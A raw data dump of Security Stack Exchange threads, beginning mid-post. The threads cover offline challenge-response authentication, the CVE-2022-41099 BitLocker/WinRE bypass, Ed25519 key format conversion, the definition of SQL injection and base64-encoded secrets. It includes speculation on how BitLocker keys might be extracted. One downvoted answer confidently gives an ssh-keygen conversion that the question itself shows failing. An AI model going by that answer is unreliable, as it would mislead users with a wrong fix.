<p>I'm in position where I can put any information on both Systems.</p>
<p>The perfect-world scenario goes like this</p>
<ol>
<li>User of an Offline System (S) wants to access protected resource</li>
<li>S presents the user some challenge string</li>
<li>User retypes the challenge in a Prover (P) (which has its own capabilities to check the user is authorized to do so)</li>
<li>The Prover computes and presents the response to the user</li>
<li>User retypes the response to System</li>
<li>System verifies the response and grants access</li>
</ol>
<p>The above scenario is time-constrained: the System will allow for time between performing 1. and 6. to be not greater than 2-5 minutes.</p>
<p>The additional requirement is protection against replay attacks against offline System.</p>
<p>Also I'd like to avoid keeping static shared secret on the offline System (so TOTP/HOTP is a no-go for me).</p>
<p>The biggest challenge for me is the size of strings the user has to retype in 3. and 6. It should fit within like 20 characters each, or assuming Base64 encoding, around 128 bits.</p>
<p>I'd go with Prover's public key installed on the System, a random string in 3. and a Prover's signature in 6, but from what I saw the size of the signature is prohibitive, 3-4 times the &quot;key size&quot; for DSA, ElGamal or Schnorr which amounts for something like 400-2k bits for secure keys.</p>
<p>I also tried with challenge string being some random message encrypted with Prover's public key and the proof being a hash of the message; this yields small response in 6., leaving large message in 3. (at worst I could live with this, using QR codes in 3., scanned instead of being retyped in 4...) and a need for additionally protecting the original random message in the System.</p>
<p>I'm not much into crypto, so maybe I'm missing some other schemes useful here, like 3-way protocols or other stuff.</p>
","0","3","267787","<p>What you're asking for isn't really possible with high security in the lengths you want, though if you relax the length limits a bit it's not too bad. S generates a challenge (should be at least 128 bits), P appends some metadata (username, timestamp, permissions, whatever) to the challenge and then signs it with a 256-bit elliptic curve-based algorithm (I recommend Ed25519), and returns the signature plus whatever metadata S needs from P and can't get from the user (possibly just the timestamp). This will be larger than 256 bits but possibly not by a lot. S reconstructs the signed string, verifies the signature and that the timestamp is recent enough, and lets the user in. You can even avoid the timestamp length cost by using a bucketed timestamp (e.g. a timestamp is always on an exact minute) and then S just checks the last N minutes (where N is something small like five) to see if any of them validate.</p>
<p>Some signature schemes tolerate signature truncation with only a linear loss of entropy, though I'm not sure if that applies to any elliptic curve ones. If it does, you could trade off less than 128 bits of security for less than 256 bits of signature to relay (though metadata length would be fixed). HMACs do have this property, but require symmetric keys (meaning S would have to store secrets, not just public keys).</p>
<p>There are ways to convey the information more easily than typing a bunch of base64. Using dictionary words greatly increases the total number of keystrokes (as each character has way less than base64's six bits of entropy) but for an experienced typist the difficult factor will be remembering and verifying the string rather than the actual typing, and words are way easier in that regard. You could use an app or printout displaying a QR code (or other 2D barcode; there are a number of options) if S has a camera. You could use a hardware device - either a dedicated piece of hardware like a smart card, or a generic USB flashdrive - that does nothing except convey the challenge in one direction and the response in the other. You could use audio from a phone app if S has a microphone or even just a microphone jack.</p>
<p>If you don't need P to be centralized, you can use smart cards, which are tiny hardware security modules with a little bit of programmable capability. A smart card can easily demand user authentication (via a password or similar) that the user enters on S (after plugging in the card), and then do a challenge-response signing as described above with the user's private key (stored on the card and not exportable). This means that user access management needs to be carried out on S itself, because there is no single P that knows about every user, but it's also a lot simpler and more user-friendly while maintaining good security (the main thing you lose, security-wise, is that the audit logs will live on S instead of P and therefore can only be monitored by systems also on or connected to S, plus if you want to revoke a user's access in a hurry and there are multiple independent S you would need to update each one individually which might create a window for attack).</p>
","2"
"267778","267778","Need for authentication in an offline system","<p>I need to design a scheme, where access to an offline System is granted based on some kind of information/proof of knowledge, provided by a separete system, Prover system.</p>
<p>I'm in position where I can put any information on both Systems.</p>
<p>The perfect-world scenario goes like this</p>
<ol>
<li>User of an Offline System (S) wants to access protected resource</li>
<li>S presents the user some challenge string</li>
<li>User retypes the challenge in a Prover (P) (which has its own capabilities to check the user is authorized to do so)</li>
<li>The Prover computes and presents the response to the user</li>
<li>User retypes the response to System</li>
<li>System verifies the response and grants access</li>
</ol>
<p>The above scenario is time-constrained: the System will allow for time between performing 1. and 6. to be not greater than 2-5 minutes.</p>
<p>The additional requirement is protection against replay attacks against offline System.</p>
<p>Also I'd like to avoid keeping static shared secret on the offline System (so TOTP/HOTP is a no-go for me).</p>
<p>The biggest challenge for me is the size of strings the user has to retype in 3. and 6. It should fit within like 20 characters each, or assuming Base64 encoding, around 128 bits.</p>
<p>I'd go with Prover's public key installed on the System, a random string in 3. and a Prover's signature in 6, but from what I saw the size of the signature is prohibitive, 3-4 times the &quot;key size&quot; for DSA, ElGamal or Schnorr which amounts for something like 400-2k bits for secure keys.</p>
<p>I also tried with challenge string being some random message encrypted with Prover's public key and the proof being a hash of the message; this yields small response in 6., leaving large message in 3. (at worst I could live with this, using QR codes in 3., scanned instead of being retyped in 4...) and a need for additionally protecting the original random message in the System.</p>
<p>I'm not much into crypto, so maybe I'm missing some other schemes useful here, like 3-way protocols or other stuff.</p>
","0","3","267849","<p>Digging deeper into ideas from @CBHacking, I found answers to question <a href=""https://security.stackexchange.com/q/33044"">What asymetric scheme provides the shortest signature, while being secure?</a> very informative. My picks:</p>
<ul>
<li>BLS (e.g. BLS12-381 used in Ethereum) produces signatures of length 2*<em>n</em> with n-bit security, the same as mentioned HMAC in @CBHacking, but using public-key scheme that suits me better (note: found <a href=""https://hackmd.io/@benjaminion/bls12-381#Security-level"" rel=""nofollow noreferrer"">comments</a> that BLS12-381 can have 117 to 120-bits security instead of 128)</li>
<li>The paper <a href=""https://eprint.iacr.org/2016/911"" rel=""nofollow noreferrer"">https://eprint.iacr.org/2016/911</a> describes how to produce 110-bits signatures with 80-bit security (but has some functional disadvantages); not really practical for me, but interesting to know the limits</li>
</ul>
","0"
"267720","267720","Why/When does patching CVE-2022-41099 (BitLocker Bypass) require extra steps?","<p>Microsoft has <a href=""https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41099"" rel=""noreferrer"">published information about a recent security problem classified as &quot;BitLocker Security Feature Bypass&quot; identified as CVE-2022-41099</a> which points out that <em>Windows Recovery Environment (WinRE)</em> images are at this time not automatically updated, but instead require <a href=""https://support.microsoft.com/en-us/topic/january-10-2023-kb5022282-os-builds-19042-2486-19044-2486-and-19045-2486-9587e4e3-c2d7-48a6-86e2-8cd9146b47fd#ID0EDD"" rel=""noreferrer"">manual steps to actually apply</a>.</p>
<blockquote>
<p>Installing the update normally into Windows will not address this
security issue in WinRE. [..] You must apply the applicable Windows security update to your Windows Recovery Environment (WinRE).</p>
</blockquote>
<p>That sounds like something only justified by exceptional circumstances, given how easily the provided instructions could results in breaking the feature altogether, and how deviating from the usual update methods will delay the updates application on many if not most systems.</p>
<blockquote>
<p>A successful attacker could bypass the BitLocker Device Encryption
feature on the system storage device.</p>
</blockquote>
<p>&quot;Bypass&quot; sounds serious, but at the same time impossible given that the same disk, encrypted the same way is <em>on disk</em> simply either protected or not protected, never conditional on the update status of the system Microsoft has setup to maintain it. Because if it did depend on that, the described &quot;attacker with physical access&quot; could just downgrade the software to get rid of that pesky security update, right?</p>
<p>What is going on here, how can this apparent contradiction be explained and what could qualify a BitLocker-enabled Windows system to justify the extra steps to update the its (never before serviced?) WinRE system.</p>
","5","3","267732","<p>These are not exceptional circumstances.</p>
<p>WinRE is an emergency / &quot;Safe Boot&quot;-like separate mini-install of Windows that is present on <em>all</em> applicable Windows systems. And because WinRE can be invoked by anyone with physical access to the device, anyone with physical access (and the knowledge) can now bypass Bitlocker.</p>
<p>And since WinRE is not patched by the Windows Update process, the <strong>only</strong> way to mitigate the threat is to create a separate process/script to <em>locally</em> apply the patch to <em>each</em> system currently running Bitlocker - <em>or potentially running Bitlocker in the future</em> - using the command-line mounting and WinRM steps provided by Microsoft.</p>
<p>In other words: anyone expecting Bitlocker to protect sensitive information (on a stolen laptop, etc.) needs to develop, test, and deploy a script to apply this fix.</p>
","0"
"267720","267720","Why/When does patching CVE-2022-41099 (BitLocker Bypass) require extra steps?","<p>Microsoft has <a href=""https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41099"" rel=""noreferrer"">published information about a recent security problem classified as &quot;BitLocker Security Feature Bypass&quot; identified as CVE-2022-41099</a> which points out that <em>Windows Recovery Environment (WinRE)</em> images are at this time not automatically updated, but instead require <a href=""https://support.microsoft.com/en-us/topic/january-10-2023-kb5022282-os-builds-19042-2486-19044-2486-and-19045-2486-9587e4e3-c2d7-48a6-86e2-8cd9146b47fd#ID0EDD"" rel=""noreferrer"">manual steps to actually apply</a>.</p>
<blockquote>
<p>Installing the update normally into Windows will not address this
security issue in WinRE. [..] You must apply the applicable Windows security update to your Windows Recovery Environment (WinRE).</p>
</blockquote>
<p>That sounds like something only justified by exceptional circumstances, given how easily the provided instructions could results in breaking the feature altogether, and how deviating from the usual update methods will delay the updates application on many if not most systems.</p>
<blockquote>
<p>A successful attacker could bypass the BitLocker Device Encryption
feature on the system storage device.</p>
</blockquote>
<p>&quot;Bypass&quot; sounds serious, but at the same time impossible given that the same disk, encrypted the same way is <em>on disk</em> simply either protected or not protected, never conditional on the update status of the system Microsoft has setup to maintain it. Because if it did depend on that, the described &quot;attacker with physical access&quot; could just downgrade the software to get rid of that pesky security update, right?</p>
<p>What is going on here, how can this apparent contradiction be explained and what could qualify a BitLocker-enabled Windows system to justify the extra steps to update the its (never before serviced?) WinRE system.</p>
","5","3","267790","<p>I am following this discussion with interest but besides the question about how to patch WinRE i have some more thoughts.
I learnd from the different variants of <strong>patching</strong> that it is quite simple to replace the WinRE .wim file with a different version.
It is no problem to extract this from windows ISO in an unpatched state.
So why should patching solve the problem if i can use any version i want instead? I think this will lead to the result that the <strong>patching is useless</strong>.
Even <strong>removing</strong> the WinRE from the device is an <strong>unclear solution</strong> - why not shrinking the partition and creating a new WinRE to start from. Not very complicated?
Also - as i can not find any detail about the attack itself - could i <strong>move the HDD</strong> to a different computer? One mentioned that we might be able to protect the computer with boot password and disable external devices. O.K. this might help allthough the users will not be very happy. But this is only a solution if the attack is needing info from the computer itself like <strong>TPM data</strong>.
At the end i come to the conclusion that <strong>patching is not even worth a try</strong> as it is simple to be undone by the attacker. Keep in mind - full physical access to the device.
At the current state - without any information about the attack itself - <strong>i do not see any solution</strong>.
If i am right with my thoughts this is dramatic problem for &quot;confidentially&quot; of data (MS itself declared the impact as high!).
Every windows 10 and 11 device is at high risk and so is localy stored data.
Does anyone have information to the attack and how it is done?
Well - some may say we should not exploit this here, but do you really think that the attackers are not aware of this info right now?</p>
","2"
"267720","267720","Why/When does patching CVE-2022-41099 (BitLocker Bypass) require extra steps?","<p>Microsoft has <a href=""https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41099"" rel=""noreferrer"">published information about a recent security problem classified as &quot;BitLocker Security Feature Bypass&quot; identified as CVE-2022-41099</a> which points out that <em>Windows Recovery Environment (WinRE)</em> images are at this time not automatically updated, but instead require <a href=""https://support.microsoft.com/en-us/topic/january-10-2023-kb5022282-os-builds-19042-2486-19044-2486-and-19045-2486-9587e4e3-c2d7-48a6-86e2-8cd9146b47fd#ID0EDD"" rel=""noreferrer"">manual steps to actually apply</a>.</p>
<blockquote>
<p>Installing the update normally into Windows will not address this
security issue in WinRE. [..] You must apply the applicable Windows security update to your Windows Recovery Environment (WinRE).</p>
</blockquote>
<p>That sounds like something only justified by exceptional circumstances, given how easily the provided instructions could results in breaking the feature altogether, and how deviating from the usual update methods will delay the updates application on many if not most systems.</p>
<blockquote>
<p>A successful attacker could bypass the BitLocker Device Encryption
feature on the system storage device.</p>
</blockquote>
<p>&quot;Bypass&quot; sounds serious, but at the same time impossible given that the same disk, encrypted the same way is <em>on disk</em> simply either protected or not protected, never conditional on the update status of the system Microsoft has setup to maintain it. Because if it did depend on that, the described &quot;attacker with physical access&quot; could just downgrade the software to get rid of that pesky security update, right?</p>
<p>What is going on here, how can this apparent contradiction be explained and what could qualify a BitLocker-enabled Windows system to justify the extra steps to update the its (never before serviced?) WinRE system.</p>
","5","3","267829","<p>I only have guesses, but with that said:</p>
<ol>
<li>It might only apply to TPM-only Bitlocker. In TPM-only mode, the encryption key is available to any OS that follows the usual boot process up to a certain point. On Windows, that point is by default reaching the Windows bootloader (this is partially configurable, albeit awkwardly, by modifying the PCRs that Bitlocker checks). Since the copy of WinRE installed on the disk is also accessed through the Windows bootloader, this might mean that the relevant PCRs are the same when booting to WinRE, in which case the Bitlocker key is unsealed. Bitlocker in TPM-only mode relies on the OS user authentication to protect against online attacks, but in WinRE there might be ways to bypass the user authentication since, historically, recovery environments assume that anybody physically at the machine is authorized to service it.</li>
<li>The bug might be a missing mitigation against an attacker extracting the key from RAM after booting but before (and without) authenticating to the OS. Normally, when the user isn't logged in (or if the session is locked), Windows disables all DMA (Direct Memory Access) that could access the relevant region of memory, where the Bitlocker key is stored (in some cases it might just block DMA from accessing certain ranges, rather than disabling it entirely). If WinRE allows some form of DMA to read the bitlocker key, then this would put the key at risk. That's especially true in TPM-only mode, but even if there's a boot-time password or external key file, an attacker who finds a booted (but locked) machine would be able to extract the key from it so long as they could do so before the machine shut down.</li>
<li>Bitlocker includes the ability to &quot;suspend&quot; encryption at various times, which it does by writing to the volume metadata (in plain text) a value that can be used to decrypt the encryption key. The user can manually suspend BitLocker, but it can also happen automatically during updates that would otherwise prevent the TPM from unsealing the key (in particular, updates to the firmware or bootloader, or possibly in some cases the kernel). Possibly this &quot;suspended&quot; key protector was being written somewhere it shouldn't be, or derived in an unsafe way, or not erased properly when protection was un-suspended. Even through the Bitlocker protectors are written to the volume metadata (not the same as the boot volume), WinRE might sometimes be responsible for them and may have mis-handled them, leading to a vector by which a knowledgeable attacker could extract the volume encryption key as though Bitlocker was suspended even though it wasn't.</li>
</ol>
<p>There seems to be almost no reliable information about that CVE, so it could also be something else entirely or even some combination of things.</p>
","2"
"267711","267711","How can I convert an ED25519 key in PKCS#8 to OpenSSH private key format?","<p>I'm having a problem where when I export a key from 1password, and use it with <code>ssh -i</code>, I get</p>
<pre><code>Load key &quot;/home/user/.ssh/private_ed25519&quot;: invalid format
</code></pre>
<p>Doing a google search on this, it seems to be a problem where 1password stores their ED25519 key in PKCS#8, <a href=""https://www.reddit.com/r/1Password/comments/u68spy/comment/i5c5vnm"" rel=""noreferrer"">from their developer</a></p>
<blockquote>
<p>Copying a private key will copy it in PKCS#8--the format 1Password stores the key. Unfortunately, OpenSSH does not support ED25519 keys in PKCS#8, only in OpenSSH format. Downloading a key will convert it to OpenSSH format. The reason RSA keys work is because OpenSSH does support RSA keys in PKCS#8.</p>
</blockquote>
<p>They suggest using a &quot;Download&quot; feature, but I don't have that feature and many other people also don't have that feature. But there should be more than one way to skin this cat,</p>
<p>You can create an ed25519 keyfile in PKCS#8 with,</p>
<pre><code>openssl genpkey -algorithm ed25519 -out private.pem
</code></pre>
<p><strong>Is there any method to convert a private Ed25519 key (<code>private.pem</code> in the above) from PKCS#8 to the OpenSSH format?</strong></p>
<p>When I try, with <code>ssh-keygen</code>, I get</p>
<pre><code>$ ssh-keygen -i -f private.pem -m pkcs8
do_convert_from_pkcs8: private.pem is not a recognised public key format
</code></pre>
","5","3","267714","<p>Yes, there is a method to convert a private Ed25519 key from PKCS#8 to the OpenSSH format. You can use the ssh-keygen command-line tool that comes with OpenSSH to convert the key. The basic syntax of the command is as follows:</p>
<pre><code>ssh-keygen -i -f keyfile.pem -m pkcs8
</code></pre>
<p>Where keyfile.pem is the file name of your PKCS#8 private key. The -i flag tells ssh-keygen to import a key, the -f flag specifies the input file and the -m flag specifies the key format as pkcs8.</p>
<p>When you run this command, ssh-keygen will convert the key and output it to the terminal. You can then redirect the output to a file to save it in the OpenSSH format:</p>
<pre><code>ssh-keygen -i -f keyfile.pem -m pkcs8 &gt; openssh-keyfile.pem
</code></pre>
<p>If you're trying to convert the key to be used in ssh-agent or ssh-add, you'll have to remove the passphrase from the key first, otherwise it will still prompt you for it when adding the key to the agent</p>
<p>The below command will prompt you to enter a new passphrase:</p>
<pre><code>ssh-keygen -i -f keyfile.pem -m pkcs8 | ssh-keygen -p -m pem
</code></pre>
","-1"
"267711","267711","How can I convert an ED25519 key in PKCS#8 to OpenSSH private key format?","<p>I'm having a problem where when I export a key from 1password, and use it with <code>ssh -i</code>, I get</p>
<pre><code>Load key &quot;/home/user/.ssh/private_ed25519&quot;: invalid format
</code></pre>
<p>Doing a google search on this, it seems to be a problem where 1password stores their ED25519 key in PKCS#8, <a href=""https://www.reddit.com/r/1Password/comments/u68spy/comment/i5c5vnm"" rel=""noreferrer"">from their developer</a></p>
<blockquote>
<p>Copying a private key will copy it in PKCS#8--the format 1Password stores the key. Unfortunately, OpenSSH does not support ED25519 keys in PKCS#8, only in OpenSSH format. Downloading a key will convert it to OpenSSH format. The reason RSA keys work is because OpenSSH does support RSA keys in PKCS#8.</p>
</blockquote>
<p>They suggest using a &quot;Download&quot; feature, but I don't have that feature and many other people also don't have that feature. But there should be more than one way to skin this cat,</p>
<p>You can create an ed25519 keyfile in PKCS#8 with,</p>
<pre><code>openssl genpkey -algorithm ed25519 -out private.pem
</code></pre>
<p><strong>Is there any method to convert a private Ed25519 key (<code>private.pem</code> in the above) from PKCS#8 to the OpenSSH format?</strong></p>
<p>When I try, with <code>ssh-keygen</code>, I get</p>
<pre><code>$ ssh-keygen -i -f private.pem -m pkcs8
do_convert_from_pkcs8: private.pem is not a recognised public key format
</code></pre>
","5","3","267767","<p>Let's walk through it. First, we generate a private key in Ed25519:</p>
<pre><code>$ openssl genpkey -algorithm ED25519 -out ed25519.pem
$ cat ed25519.pem
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEID+U9VakauO4Fsv4b/znpDHcdYg74U68siZjnWLPn7Q1
-----END PRIVATE KEY-----
</code></pre>
<p>We read the man page on <code>ssh-keygen -i</code>:</p>
<blockquote>
<pre><code> -i    This option will read an unencrypted private (or public)
       key file in the format specified by the -m option and print
       an OpenSSH compatible private (or public) key to stdout.
</code></pre>
</blockquote>
<p>and think, &quot;oh, so we just do this&quot;:</p>
<pre><code>$ ssh-keygen -i -f ed25519.pem -m pkcs8
do_convert_from_pkcs8: ed25519.pem is not a recognised public key format
</code></pre>
<p>Nope, maybe the documentation lies and the error is instructive.</p>
<p>So, we grab the <em>public key</em> corresponding to that private key:</p>
<pre><code>$ openssl pkey -in ed25519.pem -pubout &gt; ed25519.pub
$ cat ed25519.pub
-----BEGIN PUBLIC KEY-----
MCowBQYDK2VwAyEA0IgiJOLeGDwumzkm+wi82nP7wvmbnaoWKmNNHMaq/Mw=
-----END PUBLIC KEY-----
</code></pre>
<p>and try again, this time giving the <em>public key</em>:</p>
<pre><code>$ ssh-keygen -i -f ed25519.pub -m pkcs8
do_convert_from_pkcs8: unsupported pubkey type 1087
</code></pre>
<p>Dang it. Why?!</p>
<p>Well, <a href=""https://bugzilla.mindrot.org/show_bug.cgi?id=3195"" rel=""noreferrer"">it's a bug</a>:</p>
<blockquote>
<p>OpenSSH doesn't currently support reading or writing Ed25519 keys in any format other than the OpenSSH native key format.</p>
<p>Not all libcrypto implementations support Ed25519 keys, in particular LibreSSL does not.</p>
<p>This patch adds support for reading PKCS8 Ed25519 keys on recent OpenSSL, but it can't be upstreamed until LibreSSL supports these keys too.</p>
</blockquote>
<p>So, full stop, Ed25519 support is incomplete in the <code>openssl</code> available upstream (which is what we're familiar with in Linux, for example).</p>
<p>We have two possible choices:</p>
<ol>
<li>Compile a patched version of Portable OpenSSH and convert using the command above; or,</li>
<li>Use the alternative tool mentioned by the bug reporter, <a href=""https://www.npmjs.com/package/sshpk"" rel=""noreferrer""><code>sshpk</code></a>, to convert.</li>
</ol>
<p>Let's try the latter, since it's just a NPM package:</p>
<pre><code>$ npm install -g sshpk
$ sshpk-conv ed25519.pem -t ssh -p
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDQiCIk4t4YPC6bOSb7CLzac/vC+ZudqhYqY00cxqr8zAAAAJAyR1o6Mkda
OgAAAAtzc2gtZWQyNTUxOQAAACDQiCIk4t4YPC6bOSb7CLzac/vC+ZudqhYqY00cxqr8zA
AAAEA/lPVWpGrjuBbL+G/856Qx3HWIO+FOvLImY51iz5+0NdCIIiTi3hg8Lps5JvsIvNpz
+8L5m52qFipjTRzGqvzMAAAAC2VkMjU1MTkucGVtAQI=
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>and there we go: the private key in OpenSSH format.</p>
","7"
"267711","267711","How can I convert an ED25519 key in PKCS#8 to OpenSSH private key format?","<p>I'm having a problem where when I export a key from 1password, and use it with <code>ssh -i</code>, I get</p>
<pre><code>Load key &quot;/home/user/.ssh/private_ed25519&quot;: invalid format
</code></pre>
<p>Doing a google search on this, it seems to be a problem where 1password stores their ED25519 key in PKCS#8, <a href=""https://www.reddit.com/r/1Password/comments/u68spy/comment/i5c5vnm"" rel=""noreferrer"">from their developer</a></p>
<blockquote>
<p>Copying a private key will copy it in PKCS#8--the format 1Password stores the key. Unfortunately, OpenSSH does not support ED25519 keys in PKCS#8, only in OpenSSH format. Downloading a key will convert it to OpenSSH format. The reason RSA keys work is because OpenSSH does support RSA keys in PKCS#8.</p>
</blockquote>
<p>They suggest using a &quot;Download&quot; feature, but I don't have that feature and many other people also don't have that feature. But there should be more than one way to skin this cat,</p>
<p>You can create an ed25519 keyfile in PKCS#8 with,</p>
<pre><code>openssl genpkey -algorithm ed25519 -out private.pem
</code></pre>
<p><strong>Is there any method to convert a private Ed25519 key (<code>private.pem</code> in the above) from PKCS#8 to the OpenSSH format?</strong></p>
<p>When I try, with <code>ssh-keygen</code>, I get</p>
<pre><code>$ ssh-keygen -i -f private.pem -m pkcs8
do_convert_from_pkcs8: private.pem is not a recognised public key format
</code></pre>
","5","3","268151","<p>Not my (original) work, copied from another thread when I was trying
to find out something related (bugs fixed / added by me)</p>
<p>-- a shell script that converts openssl-generated ed25519 private key
to a format understood by openssh</p>
<p>tested the following way:</p>
<pre><code>$ openssl genpkey -algorithm ED25519 -out ed25519.pem
$ ./eddsa-ssl-to-ossh.sh ed25519.pem &gt; okey
$ ssh-keygen -l -f okey
</code></pre>
<pre><code>#!/bin/sh

set -euf

ssl_priv=$(cat ${1:+&quot;$1&quot;})

pub64=$(echo &quot;$ssl_priv&quot; | openssl pkey -pubout -outform der 2&gt;/dev/null | dd bs=12 skip=1 status=none | base64)

test &quot;$pub64&quot; || { echo &quot;Cannot get public key&quot; &gt;&amp;2; exit 1; }

priv64=$(echo &quot;$ssl_priv&quot; | grep -v '^-' | base64 -d | dd bs=16 skip=1 status=none | base64)

echo '-----BEGIN OPENSSH PRIVATE KEY-----'

{
    printf openssh-key-v1'\000\000\000\000\004'none'\000\000\000\004'none'\000\000\000\000\000\000\000\001\000\000\000'3
    printf '\000\000\000\013'ssh-ed25519'\000\000\000 '
    echo $pub64 | base64 -d
    printf '\000\000\000'
    printf '\210\000\000\000\000\000\000\000\000'
    printf '\000\000\000\013'ssh-ed25519'\000\000\000 '
    echo $pub64 | base64 -d
    printf '\000\000\000@'
    echo $priv64| base64 -d
    echo $pub64 | base64 -d
    printf '\000\000\000\000\001\002\003\004\005'
} | base64

echo '-----END OPENSSH PRIVATE KEY-----'
</code></pre>
","0"
"267679","267679","Does SQL injection attack cover installing malware that deletes or modifies the database?","<p>I know that SQL Injection attack can be done by injecting the application with SQL statements to retrieve info you are not authorized to get or to modify the data in an unauthorized way, as mentioned in this link <a href=""https://www.w3schools.com/sql/sql_injection.asp"" rel=""noreferrer"">https://www.w3schools.com/sql/sql_injection.asp</a>.</p>
<p>But let's say someone installs malware inside the database server which modifies or retrieves data, does this count as a SQL injection attack?</p>
","6","3","267681","<p>No, that's not necessarily a SQL injection attack.</p>
<p>SQL injection specifically describes the scenario where I have a prewritten SQL statement that requires input parameters, and you exploit those input parameters to make my SQL statement do something else. For example, my application has a <code>get_user(id)</code> method, and you provide a specially crafted string <em>instead of</em> a valid user ID that makes my method do something else entirely, such as delete a specific user or return the list of people subscribed to the newsletter.</p>
<p>This attack can happen because I didn't sufficiently validate untrusted input or guard the SQL I want to run from attacks of this nature.</p>
<p>SQL injection does not describe, in general, running SQL against a database. It's <em>just</em> the attack of exploiting points where input is provided to a SQL statement. If I write my own malicious SQL statements and run them against a server, that's an attack that used SQL, just not a <em>SQL injection</em> attack.</p>
<p>If we pull off a successful malware attack and get our malware installed on a target system, that malware is now in a position to perform further attacks for us. If it connects to the database and starts running its own arbitrary SQL to control it, that's not SQL injection. It could, however, perhaps use my application's bad <code>get_user(id)</code> method to, in turn, perform SQL injection to execute that control.</p>
","27"
"267679","267679","Does SQL injection attack cover installing malware that deletes or modifies the database?","<p>I know that SQL Injection attack can be done by injecting the application with SQL statements to retrieve info you are not authorized to get or to modify the data in an unauthorized way, as mentioned in this link <a href=""https://www.w3schools.com/sql/sql_injection.asp"" rel=""noreferrer"">https://www.w3schools.com/sql/sql_injection.asp</a>.</p>
<p>But let's say someone installs malware inside the database server which modifies or retrieves data, does this count as a SQL injection attack?</p>
","6","3","267682","<p>SQL injection, and any other injection attack, is defined by the <em>attack method</em> not the effect or output. To quote your link:</p>
<blockquote>
<p>SQL injection is the placement of malicious code in SQL statements</p>
</blockquote>
<p>So, yes, if malware was placed on the database by means of injecting the malware through the SQL queries, then yes, that's a SQL injection attack.</p>
<p>If the malware was installed by any other method, then that installation is not SQL injection.</p>
<p>The malware might end up performing SQL injection as part of it's function, but your stated context is the installation.</p>
","14"
"267679","267679","Does SQL injection attack cover installing malware that deletes or modifies the database?","<p>I know that SQL Injection attack can be done by injecting the application with SQL statements to retrieve info you are not authorized to get or to modify the data in an unauthorized way, as mentioned in this link <a href=""https://www.w3schools.com/sql/sql_injection.asp"" rel=""noreferrer"">https://www.w3schools.com/sql/sql_injection.asp</a>.</p>
<p>But let's say someone installs malware inside the database server which modifies or retrieves data, does this count as a SQL injection attack?</p>
","6","3","267773","<p>SQL injection is a pathway not a destination.</p>
<p>SQL injection can result in</p>
<ul>
<li>Privilege escalation</li>
<li>Exfiltration,</li>
<li>Data modification</li>
<li>File modification</li>
<li>Arbitrary code execution</li>
</ul>
<blockquote>
<p>But let's say someone installs malware inside the database server which modifies or retrieves data, does this count as a SQL injection attack?</p>
</blockquote>
<p>No. not unless the malware uses SQLI.</p>
<p>Installing the malware my be possible via SQLI  but the software itself as you describe it is shellcode or a persistant threat.</p>
","0"
"267592","267592","Randomly generated secrets: encoding the random bytes in base64 vs keeping them","<p>Today this came to my attention.<br>
When generating random secrets for e.g. JWT (in node.js the most common way is using the <code>crypto.randomBytes()</code> method), I have noticed <em>a lot</em> of people save these tokens in a base64-encoded manner (i.e. <code>crypto.randomBytes(len).toString('base64')</code>.</p>
<p><strong>Charset</strong><br>
However, I thought to my self: doesn't saving a random byte buffer in a base64 encoded string undermine the whole principle of them being 'random bytes'? <strong>Base64 has a charset of only 64 characters while the native <code>crypto.randomBytes.toString()</code> method supports 2^8 = 256 characters.</strong></p>
<p><strong>Ratio</strong><br>
Lets say we have a buffer with length <em>n</em>. For a not-base64-encoded buffer of <em>n</em> the encoded counterpart has the length of <img src=""https://latex.codecogs.com/gif.latex?4%5Bn/3%5D"" alt="""" />, which means a base64 encoded string has a overhead of approximately 133% their non encoded counterpart.</p>
<p>Many of you already know this, but for those who don't know: each base64 character represents 6 bits (<img src=""https://latex.codecogs.com/gif.latex?%5E2log%2864%29%20%3D%206"" alt="""" />).<br>
4 * 6 bits = 12 bits = 3 bytes. this means there are 4 characters encoded for a three byte buffer.</p>
<p>However, I said approximately 133% because the output length is rounded up to a multiple of 4. This means that e.g. 1, 2, 3 bytes become 4 bytes; while 4, 5 and 6 are rounded up to 8 bytes. (this is the trailing <code>=</code> you see on base64 encoded buffers most of the time).<br>
<strong>Thus, the ratio is approximately 1 to 4 thirds (1:1.33)</strong></p>
<p><strong>With the following explaination, what is the smartest thing to do? Saving the buffer itself (short with big charset) or saving the base64 encoded buffer (long with small charset)?<br>Or doesn't it matter for bruteforce applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</strong></p>
<pre><code>
const crypto = require('crypto');
const random = crypto.randomBytes(128);
const lenBuffer = random.length;
const lenBase64 = encodeURI(random.toString('base64')).split(/%..|./).length - 1;

console.log(lenBuffer, lenBase64); // 128 172 =&gt; 128 * 1.33 = 170

</code></pre>
<p><strong>Edit:</strong><br>
I might not have been clear in my question, my apologies. My primary question here is - what would be faster to bruteforce, the short and complex byte buffer or the longer and less complex base64 encoded string? According to <a href=""https://www.omnicalculator.com/other/password-entropy"" rel=""nofollow noreferrer"">password entropy</a> the length and complexity are not equally proportional, for they are logaritmic instead.</p>
","5","5","267593","<p>It doesn't matter. A number doesn't change because you change the encoding of it.</p>
<p>101<sub>2</sub> and 5<sub>10</sub> is the same number, and contain the same amount of information.</p>
<p>The reason we use base64 is that it is safe printable characters; they won't screw up your terminal if you output them to it, and they will transmit nicely in any computer system capable of handling 7-bit ASCII. The drawback is as you observed the increased overhead.</p>
<blockquote>
<p>Or doesn't it matter for brute force applications because the amount of bits is almost the same? Or is base64 even safer because base64 is always 0-2 characters longer?</p>
</blockquote>
<p>It's not <em>almost</em> the same. It is <em>the</em> same. Computers treat information as numbers – large numbers. If you represent that number as 8-bit bytes, each digit conveys 8 bits of information. If you represent that number as base64, each digit conveys 6 bits of information. It's still <em>the same number</em>, but the number of digits increased due to lower information content per digit.</p>
<p>Your question is like asking which bus is the soonest: the one in 600 seconds, the one in ten minutes or the one in 10 minutes.</p>
","62"
"267592","267592","Randomly generated secrets: encoding the random bytes in base64 vs keeping them","<p>Today this came to my attention.<br>
When generating random secrets for e.g. JWT (in node.js the most common way is using the <code>crypto.randomBytes()</code> method), I have noticed <em>a lot</em> of people save these tokens in a base64-encoded manner (i.e. <code>crypto.randomBytes(len).toString('base64')</code>.</p>
<p><strong>Charset</strong><br>
